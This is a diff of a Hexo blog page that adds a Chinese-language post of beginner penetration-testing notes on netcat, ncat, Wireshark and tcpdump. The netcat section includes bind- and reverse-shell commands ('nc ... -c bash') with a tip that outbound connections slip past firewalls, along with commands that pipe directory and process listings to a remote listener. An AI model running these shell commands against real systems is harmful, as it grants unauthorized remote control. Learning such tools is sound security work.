@@ -4,8 +4,18 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="test, Hexo">
-    <meta name="description" content="test | Hexo">
+    <meta name="keywords" content="渗透测试——基本工具, Hexo">
+    <meta name="description" content="渗透测试——基本工具一、NETCAT（nc)
+网络工具中的瑞士军刀（小身材、大智慧）
+侦听模式/传输模式
+telent/获取banner信息
+传输文本信息
+传输文件/目录
+加密传输文件
+远程控制/木马
+加密所有流量
+流媒体服务器
+远程克隆硬">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +23,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>test | Hexo</title>
+    <title>渗透测试——基本工具 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -303,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">test</h1>
+                    <h1 class="description center-align post-title">渗透测试——基本工具</h1>
                 </div>
             </div>
         </div>
@@ -446,7 +456,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.7k
                 </div>
                 
 
@@ -459,7 +469,120 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul>
+<li>网络工具中的瑞士军刀（小身材、大智慧）</li>
+<li>侦听模式/传输模式</li>
+<li>telent/获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件/目录</li>
+<li>加密传输文件</li>
+<li>远程控制/木马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li>远程克隆硬盘</li>
+</ul>
+<p><strong>NC（TELNET/BANNER功能）</strong></p>
+<ul>
+<li>nc -nv 1.1.1.1 110</li>
+<li>nc -nv 1.1.1.1 25</li>
+<li>nc -nv 1.1.1.1 80</li>
+</ul>
+<p>nc作为客户端时，可以对服务器端进行侦听</p>
+<p><strong>示例：</strong></p>
+<p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p>
+<p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p>
+<p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p>
+<p>通过以上命令可以在命令行下接受邮件。</p>
+<h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p>
+<p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p>
+<p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p>
+<p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p>
+<h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p>
+<p>A对B当前目录信息进行取证</p>
+<p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p>
+<p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p>
+<p><strong>示例2：</strong></p>
+<p>A对B当前系统进程信息进行取证并存档</p>
+<p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p>
+<p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p>
+<p>A:cat ps.txt #查看ps.txt文件内容</p>
+<p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p>
+<h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p>
+<p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p>
+<p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p>
+<p><strong>反向文件运输</strong></p>
+<p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p>
+<p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p>
+<h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p>
+<p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p>
+<p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p>
+<h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p>
+<p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p>
+<p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p>
+<h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p>
+<p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p>
+<p>客户端：nc -nv ip port </p>
+<p>客户端开启远程控制：</p>
+<p>服务器端：nc -lp port</p>
+<p>客户端：nc -nv IP port -c bash </p>
+<p>window上将-c bash 改为-c cmd</p>
+<p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p>
+<p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p>
+<p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p>
+<h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p>
+<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p>
+<p>nc版本太多，参数各不相同，使用起来有困难。</p>
+<p>Ubantu版本没有-c，需要用临时文件去转换bash</p>
+<p>遇到问题查看man命令手册（系统自带软件）</p>
+<p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p>
+<p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p>
+<h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p>
+<ul>
+<li>抓包嗅探协议分析</li>
+<li>抓包引擎</li>
+<li>Libpcap9–Linux</li>
+<li>winpcap10-windows</li>
+</ul>
+<p><strong>基本使用方法：</strong></p>
+<p>1、终端输入wireshark，启动</p>
+<p> 2、选择要抓包的网卡。</p>
+<p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p>
+<p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p>
+<p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p>
+<p> 6、通过分析-显示过滤器对抓包结果进行过滤</p>
+<p><strong>数据包的分层结构</strong></p>
+<ul>
+<li>Arp</li>
+<li>lcmp</li>
+<li>Tcp三次握手</li>
+</ul>
+<p>1.源向目标发送syn包（确认连接）</p>
+<p>2.目标向源发送syn、ack（回应并向源确认）</p>
+<p>3.源向目标发送ack包（回应目标发送的syn）</p>
+<ul>
+<li>Udp</li>
+<li>Dns</li>
+<li>http</li>
+<li>ftp</li>
+</ul>
+<p><strong>数据流</strong></p>
+<ul>
+<li>TCP流</li>
+<li>UDP流</li>
+<li>SSL流</li>
+<li>HTTP流</li>
+</ul>
+<h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p>
+<pre><code>tcpdump -i eth0 -s 0 -w a.cap/b.pcap</code></pre><p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p>
+<pre><code>tcpdump -r a.cap/b.cap</code></pre><p>-r read读取</p>
+<pre><code>tcpdump -A -r a.cap/b.cap</code></pre><p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p>
+<h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><pre><code>tcpdump -i eth0 port 22</code></pre><p>抓以太网0上22端口的包。</p>
+<pre><code>tcpdump -i eth0 tcp port 22</code></pre><p>抓以太网0上22端口的TCP包。 curl -v URL</p>
+<h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u</code></pre><p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p>
+<pre><code>tcpdump -n src host IP -r file.cap/file.pcap</code></pre><p>src host IP 指定来源IP，src–&gt;source</p>
+<pre><code>tcpdump -n dst host IP -r file.cap/file.pcap</code></pre><p>dst destination，指定目标IP</p>
+<pre><code>tcpdump -n udp port 53  -r file.cap/file.pcap</code></pre><p>udp 指定显示的协议  port 53 指定端口</p>
+
             </div>
             <hr/>
 
@@ -484,7 +607,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://shu1l.github.io/test/index.html">https://shu1l.github.io/test/index.html</a>
+                    <a href="https://shu1l.github.io/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/">https://shu1l.github.io/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -685,18 +808,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/test/index.html">
+                <a href="/2020/03/12/shen-tou-ce-shi-web-shen-tou/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="test">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="渗透测试——web渗透">
                         
-                        <span class="card-title">test</span>
+                        <span class="card-title">渗透测试——web渗透</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -706,9 +828,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-12
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -717,7 +839,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -725,22 +846,38 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/test/index.html">
+                <a href="/2020/03/12/linux-an-zhuang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="test">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="linux安装">
                         
-                        <span class="card-title">test</span>
+                        <span class="card-title">linux安装</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            kali linux安装部分相关知识kali安装硬盘安装
+下载安装镜像
+https://www.kali.org/downloads
+
+验证hash值
+
+制作启动光盘
+live
+
+制作启动U盘
+
+设置BIOS启动顺序
+
+启动安装
+
+
+doc
                         
                     </div>
                     <div class="publish-info">
@@ -755,7 +892,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
